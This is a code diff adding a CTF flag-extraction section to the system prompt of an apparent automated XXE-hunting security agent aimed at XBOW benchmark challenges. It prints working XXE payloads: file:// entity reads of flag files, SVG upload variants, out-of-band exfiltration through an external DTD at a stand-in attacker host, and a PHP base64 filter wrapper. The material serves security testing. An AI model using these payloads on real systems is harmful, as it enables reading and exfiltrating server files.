@@ -95,7 +95,30 @@ IMPORTANT RULES:
 - Never exfiltrate real sensitive data — use proof-of-concept files only (/etc/passwd, /etc/hostname, /etc/os-release)
 - Document every finding with full reproduction steps including exact XML payload, Content-Type header, and endpoint
 - Report the parser type, entity method used, and any bypasses required
-- For blind XXE, always provide the interactsh callback evidence`;
+- For blind XXE, always provide the interactsh callback evidence
+
+## CTF FLAG EXTRACTION (when target is an XBEN-* CTF challenge)
+
+XBOW XXE challenges typically allow file read via XML entity expansion. Read the flag directly:
+
+1. **Classic in-band file read**:
+   <?xml version="1.0"?>
+   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
+   <foo>&xxe;</foo>
+   POST as Content-Type: application/xml or text/xml.
+2. **SVG payloads (for image upload challenges, XBEN-077-24 style)**:
+   <?xml version="1.0" standalone="no"?>
+   <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
+   <svg ...><text>&xxe;</text></svg>
+   Upload as profile picture / avatar; the rendered SVG embeds the flag.
+3. **OOB exfil via parameter entities** (when in-band echo is suppressed):
+   - Host an external DTD: <!ENTITY % file SYSTEM "file:///flag.txt"> <!ENTITY % oob SYSTEM "http://OAST/?x=%file;">
+   - Trigger from the target: <?xml version="1.0"?> <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker/oob.dtd"> %xxe; %oob;]>
+4. **Common XBOW flag locations** to try:
+   /flag.txt, /flag, /app/flag.txt, /opt/flag.txt
+5. **PHP wrappers if target is PHP-based** (exfil binary content): file=php://filter/convert.base64-encode/resource=/flag.txt
+
+Once the flag string is in the response (or the OAST log), include FLAG{...} verbatim in the finding's evidence array.`;
 
 export class XxeHunterAgent implements BaseAgent {
   readonly metadata: AgentMetadata = {
